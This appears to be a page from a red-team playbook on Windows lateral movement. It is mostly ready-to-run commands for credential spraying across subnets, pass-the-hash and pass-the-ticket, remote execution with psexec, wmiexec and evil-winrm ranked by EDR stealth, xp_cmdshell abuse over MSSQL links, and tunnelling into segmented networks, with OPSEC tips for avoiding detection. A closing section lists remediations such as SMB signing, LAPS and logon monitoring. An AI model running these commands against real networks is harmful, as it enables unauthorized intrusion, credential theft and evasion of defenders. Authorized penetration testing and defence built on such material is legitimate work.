# Stage 7 — Lateral Movement & Execution

Validate access broadly before executing, and prefer the quietest exec method
that proves the hop.

## Where can this credential go? (spray access)
```bash
nxc smb <subnet/24> -u user -p pass                  # green = access
nxc smb <subnet/24> -u user -H <nthash>              # pass-the-hash sweep
nxc smb <subnet/24> -u admin -p pass -d corp.local | grep Pwn3d   # local admin
nxc winrm <subnet/24> -u user -p pass                # WinRM reachable
nxc mssql <subnet/24> -u user -p pass                # MSSQL logins
```

## Pass-the-Hash (PtH)
NTLM hash used directly, no cracking:
```bash
nxc smb <host> -u administrator -H <nthash> --local-auth
psexec.py -hashes :<nthash> administrator@<host>
wmiexec.py -hashes :<nthash> corp.local/user@<host>
evil-winrm -i <host> -u user -H <nthash>
```

## Pass-the-Ticket (PtT) / overpass-the-hash
```bash
getTGT.py corp.local/user -hashes :<nthash>          # -> user.ccache
export KRB5CCNAME=user.ccache
nxc smb <host> -k --use-kcache
psexec.py -k -no-pass corp.local/user@host.corp.local
```
Use forged/silver tickets the same way (kerberos-attacks.md).

## Execution methods (loudest → quietest, pick per EDR)
```bash
psexec.py corp.local/admin:pass@<host>       # SYSTEM, creates service (loud)
smbexec.py corp.local/admin:pass@<host>      # semi-interactive, no binary drop
wmiexec.py corp.local/admin:pass@<host>      # WMI, fairly quiet
atexec.py  corp.local/admin:pass@<host> cmd  # scheduled task
evil-winrm -i <host> -u user -p pass         # WinRM (if 5985 open) — clean-ish
nxc smb <host> -u admin -p pass -x 'whoami'  # one-off command
```

## MSSQL lateral movement
```bash
mssqlclient.py corp.local/user:pass@<host> -windows-auth
# inside: enable xp_cmdshell, or use links to pivot between SQL servers
nxc mssql <host> -u user -p pass -M mssql_priv     # check sysadmin / impersonation
nxc mssql <host> -u user -p pass -x 'whoami'       # xp_cmdshell exec
```
Database links (`EXECUTE AS`, `openquery`) chain across trusted SQL servers, often
landing SYSTEM on another box.

## RDP / other
```bash
nxc rdp <subnet/24> -u user -p pass                 # where RDP works
xfreerdp /u:user /p:pass /v:<host>
```

## SOCKS pivoting to reach segmented networks
```bash
# via a compromised host — ligolo-ng / chisel / proxychains + Impacket -ts
ligolo-ng   # agent on foothold, tunnel to internal subnets, then run nxc through it
```

## OPSEC
psexec service creation (7045) and new-service events are heavily monitored;
prefer wmiexec/WinRM. PtH shows anomalous logon types. Keep commands benign,
clean up services/scheduled tasks/tickets, and avoid touching more hosts than the
engagement needs.

## Remediation to recommend
Enforce SMB signing; LAPS (unique local admin passwords kills PtH reuse);
disable NTLM where feasible; tiered admin + logon-restriction GPOs (deny
workstation logon to server/DA accounts); Credential Guard; network
segmentation; monitor 4624 type-3/9, 7045, and remote-exec patterns.
